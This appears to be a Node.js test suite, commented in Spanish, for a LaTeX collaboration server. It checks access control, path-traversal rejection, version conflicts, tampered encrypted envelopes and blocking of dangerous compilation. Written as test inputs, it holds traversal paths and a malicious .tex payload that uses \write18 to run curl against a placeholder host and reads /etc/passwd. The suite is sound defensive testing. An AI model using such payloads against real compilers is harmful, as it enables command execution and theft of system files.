// Casos de abuso sobre los archivos del proyecto: IDOR entre proyectos,
// rol insuficiente, recorrido de rutas, concurrencia y compilación peligrosa.
// Amenazas: T-P03, T-P07, T-C01 (\write18), T-C02 (lectura fuera del proyecto).
import assert from 'node:assert/strict';
import { before, describe, it } from 'node:test';
import { context, open, replyKeys, seal } from './crypto-client.mjs';
import { verifiedUser } from './helpers.mjs';

const sealed = (client, path, ctx) => {
  const keys = replyKeys();
  return client.get(path, { headers: { 'X-SecurTex-Reply-Key': keys.header } }).then((res) => ({ ...res, data: res.status === 200 ? JSON.parse(open(res.body.envelope, keys, ctx)) : null }));
};
const H = () => ({ headers: { 'X-SecurTex-Reply-Key': replyKeys().header } });

describe('Archivos cifrados del proyecto', () => {
  let owner, editor, viewer, stranger, projectId, otherProjectId, mainId;

  const join = async (member, role) => {
    const inv = await owner.client.post(`/projects/${projectId}/invitations`, { email: member.email, role });
    assert.equal(inv.status, 201);
    const invitation = (await member.client.get('/invitations')).body.find((i) => i.project.id === projectId);
    assert.equal((await member.client.post(`/invitations/${invitation.id}/accept`)).status, 200);
  };

  before(async () => {
    [owner, editor, viewer, stranger] = await Promise.all([
      verifiedUser('duena'), verifiedUser('editora'), verifiedUser('lectora'), verifiedUser('extrano'),
    ]);
    const created = await owner.client.post('/projects', { name: 'Tesis cifrada', template: 'tesis-uta' });
    assert.equal(created.status, 201);
    projectId = created.body.id;
    otherProjectId = (await stranger.client.post('/projects', { name: 'Proyecto del extraño' })).body.id;
    await join(editor, 'editor');
    await join(viewer, 'viewer');
    const files = await owner.client.get(`/projects/${projectId}/files`);
    mainId = files.body.find((f) => f.path === 'main.tex').id;
  });

  it('la plantilla crea los archivos en el servidor y se leen descifrados', async () => {
    const res = await sealed(owner.client, `/projects/${projectId}/files/contents`, context(projectId, 'files:contents'));
    assert.equal(res.status, 200);
    const paths = res.data.map((f) => f.path).sort();
    assert.ok(paths.includes('main.tex') && paths.includes('referencias.bib') && paths.includes('capitulos/introduccion.tex'));
    assert.match(res.data.find((f) => f.path === 'main.tex').content, /\\documentclass/);
  });

  it('un ajeno recibe 404 en el árbol, el contenido y la escritura', async () => {
    assert.equal((await stranger.client.get(`/projects/${projectId}/files`)).status, 404);
    assert.equal((await stranger.client.get(`/projects/${projectId}/files/contents`, H())).status, 404);
    assert.equal((await stranger.client.get(`/projects/${projectId}/files/${mainId}`, H())).status, 404);
    assert.equal((await stranger.client.put(`/projects/${projectId}/files/${mainId}/content`, { envelope: await seal('x', context(projectId, `file:${mainId}:write`)), baseVersion: 1 })).status, 404);
  });

  it('IDOR: un archivo no se alcanza a través de otro proyecto propio', async () => {
    assert.equal((await stranger.client.get(`/projects/${otherProjectId}/files/${mainId}`, H())).status, 404);
    assert.equal((await stranger.client.del(`/projects/${otherProjectId}/files/${mainId}`)).status, 404);
  });

  it('un lector puede leer pero no escribir, crear ni borrar (403)', async () => {
    assert.equal((await viewer.client.get(`/projects/${projectId}/files/${mainId}`, H())).status, 200);
    const write = await viewer.client.put(`/projects/${projectId}/files/${mainId}/content`, { envelope: await seal('x', context(projectId, `file:${mainId}:write`)), baseVersion: 1 });
    assert.equal(write.status, 403);
    assert.equal(write.body.code, 'insufficient_role');
    assert.equal((await viewer.client.post(`/projects/${projectId}/files`, { path: 'nuevo.tex', envelope: await seal('', context(projectId, 'file:create')) })).status, 403);
  });

  it('rutas peligrosas se rechazan con 400', async () => {
    for (const path of ['../fuera.tex', '/etc/passwd.tex', 'a\\b.tex', '.oculto.tex', 'x.sh', 'a/b/c/d/e.tex']) {
      const res = await editor.client.post(`/projects/${projectId}/files`, { path, envelope: await seal('', context(projectId, 'file:create')) });
      assert.equal(res.status, 400, `debió rechazar ${path}`);
    }
  });

  it('autoguardado con concurrencia optimista: la versión vieja recibe 409', async () => {
    const current = (await sealed(editor.client, `/projects/${projectId}/files/${mainId}`, context(projectId, `file:${mainId}`))).data;
    const ok = await editor.client.put(`/projects/${projectId}/files/${mainId}/content`, { envelope: await seal(`${current.content}\n% editado`, context(projectId, `file:${mainId}:write`)), baseVersion: current.version });
    assert.equal(ok.status, 200);
    assert.equal(ok.body.version, current.version + 1);
    const stale = await owner.client.put(`/projects/${projectId}/files/${mainId}/content`, { envelope: await seal('pisado', context(projectId, `file:${mainId}:write`)), baseVersion: current.version });
    assert.equal(stale.status, 409);
    assert.equal(stale.body.code, 'version_conflict');
  });

  it('crear, renombrar y borrar; el principal no se borra', async () => {
    const created = await editor.client.post(`/projects/${projectId}/files`, { path: 'anexos/a.tex', envelope: await seal('Anexo', context(projectId, 'file:create')) });
    assert.equal(created.status, 201);
    assert.equal((await editor.client.post(`/projects/${projectId}/files`, { path: 'anexos/a.tex', envelope: await seal('', context(projectId, 'file:create')) })).status, 409);
    const renamed = await editor.client.patch(`/projects/${projectId}/files/${created.body.id}`, { path: 'anexos/b.tex' });
    assert.equal(renamed.status, 200);
    assert.equal(renamed.body.path, 'anexos/b.tex');
    assert.equal((await editor.client.del(`/projects/${projectId}/files/${created.body.id}`)).status, 200);
    const main = await editor.client.del(`/projects/${projectId}/files/${mainId}`);
    assert.equal(main.status, 409);
    assert.equal(main.body.code, 'main_file');
  });

  it('el documento principal debe existir en el proyecto', async () => {
    const res = await owner.client.patch(`/projects/${projectId}`, { mainFile: 'no-existe.tex' });
    assert.equal(res.status, 400);
  });

  it('el análisis del servidor bloquea \\write18 y lecturas fuera del proyecto', async () => {
    const clean = await editor.client.post(`/projects/${projectId}/compile/analyze`);
    assert.equal(clean.status, 200);
    assert.notEqual(clean.body.verdict, 'blocked');
    const evil = await editor.client.post(`/projects/${projectId}/files`, { path: 'malo.tex', envelope: await seal('\\immediate\\write18{curl evil.test}\n\\input{/etc/passwd}', context(projectId, 'file:create')) });
    assert.equal(evil.status, 201);
    const blocked = await editor.client.post(`/projects/${projectId}/compile/analyze`);
    assert.equal(blocked.body.verdict, 'blocked');
    assert.deepEqual(blocked.body.findings.map((f) => f.rule).sort(), ['read-outside', 'shell-escape']);
    assert.equal((await stranger.client.post(`/projects/${projectId}/compile/analyze`)).status, 404);
  });

  it('un sobre sellado para otro proyecto o manipulado se rechaza', async () => {
    const otherCtx = await seal('x', context(otherProjectId, 'file:create'));
    assert.equal((await editor.client.post(`/projects/${projectId}/files`, { path: 'reubicado.tex', envelope: otherCtx })).status, 409);
    const env = await seal('hola', context(projectId, 'file:create'));
    const body = Buffer.from(env.body, 'base64url');
    body[5] ^= 1;
    assert.equal((await editor.client.post(`/projects/${projectId}/files`, { path: 'roto.tex', envelope: { ...env, body: body.toString('base64url') } })).status, 409);
  });

  it('cuota: un archivo de más de 1 MB se rechaza', async () => {
    const res = await editor.client.post(`/projects/${projectId}/files`, { path: 'grande.tex', envelope: await seal('a'.repeat(1_000_001), context(projectId, 'file:create')) });
    assert.ok([400, 413].includes(res.status), `estado ${res.status}`);
  });
});

describe('Administración de usuarios', () => {
  it('un usuario normal no lista ni suspende cuentas (403)', async () => {
    const user = await verifiedUser('normal');
    assert.equal((await user.client.get('/admin/users')).status, 403);
    assert.equal((await user.client.post(`/admin/users/${user.id}/suspend`)).status, 403);
  });
});
